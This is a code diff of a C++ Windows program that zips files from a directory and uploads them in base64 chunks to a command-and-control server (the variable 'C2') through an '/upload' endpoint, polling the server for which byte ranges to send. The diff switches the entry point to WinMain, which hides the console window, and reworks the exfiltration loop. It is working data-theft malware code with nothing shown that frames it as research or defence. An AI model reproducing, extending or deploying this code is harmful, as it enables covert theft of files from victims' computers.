@@ -65,7 +65,7 @@ void GenZip() {
 }
 
 
-int main() {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     std::wstring uid;
     std::string pubDir = PublicDir();
     std::string zipFile = pubDir + "zipped.zip";
@@ -116,33 +116,33 @@ int main() {
                 std::string FileStatusResp = SendData(L"POST", FileStatusURL, L"", UidJson, L"");
                 auto FileJSONResp = nlohmann::json::parse(FileStatusResp);
 
-                if (!(FileJSONResp.contains("status") && FileJSONResp["status"] == "incomplete")) {
-                    break;
+                if (FileJSONResp.contains("status") && FileJSONResp["status"] == "incomplete") {
+                    std::cout << "JSON response: " << FileJSONResp << std::endl;
+
+                    // Read required bytes from the server's JSON response:
+                    int start_byte = FileJSONResp["start_byte"];
+                    int end_byte = FileJSONResp["end_byte"];
+
+                    // Grab the required bytes from start to end and encode them into base64
+                    std::vector<char> requiredBytes = RetReqBytes(zipFile, start_byte, end_byte);
+                    std::string base64Encoded = EncodeBase64(std::string(requiredBytes.begin(), requiredBytes.end()));
+
+                    // Construct a JSON object that contains the encoded file bytes and the client's UID:
+                    nlohmann::json EncodedBytes;
+                    EncodedBytes["file_data"] = base64Encoded;
+                    EncodedBytes["uid"] = WStringToString(uid);
+
+                    // Upload the requested bytes to the server:
+                    std::wstring FileUploadURL = C2 + L"/upload";
+                    std::string FilerResponse = SendData(L"POST", FileUploadURL, L"", EncodedBytes, L"");
+                    std::cout << "JSON response for /upload: " << FilerResponse << std::endl;
+                    Sleep(2000);
                 }
 
-                std::cout << "JSON response: " << FileJSONResp << std::endl;
-
-                // Read required bytes from the server's JSON response:
-                int start_byte = FileJSONResp["start_byte"];
-                int end_byte = FileJSONResp["end_byte"];
-
-                // Grab the required bytes from start to end and encode them into base64
-                std::vector<char> requiredBytes = RetReqBytes(zipFile, start_byte, end_byte);
-                std::string base64Encoded = EncodeBase64(std::string(requiredBytes.begin(), requiredBytes.end()));
-
-                // Construct a JSON object that contains the encoded file bytes and the client's UID:
-                nlohmann::json EncodedBytes;
-                EncodedBytes["file_data"] = base64Encoded;
-                EncodedBytes["uid"] = WStringToString(uid);
-
-                // Upload the requested bytes to the server:
-                std::wstring FileUploadURL = C2 + L"/upload";
-                std::string FilerResponse = SendData(L"POST", FileUploadURL, L"", EncodedBytes, L"");
-                std::cout << "JSON response for /upload: " << FilerResponse << std::endl;
-                //Sleep(2000);
+                else if (FileJSONResp.contains("status") && FileJSONResp["status"] == "completed") {
+                    break;
+                }
             }
-            
-
         } while (true);
 
         std::cout << "File upload has been completed." << std::endl;
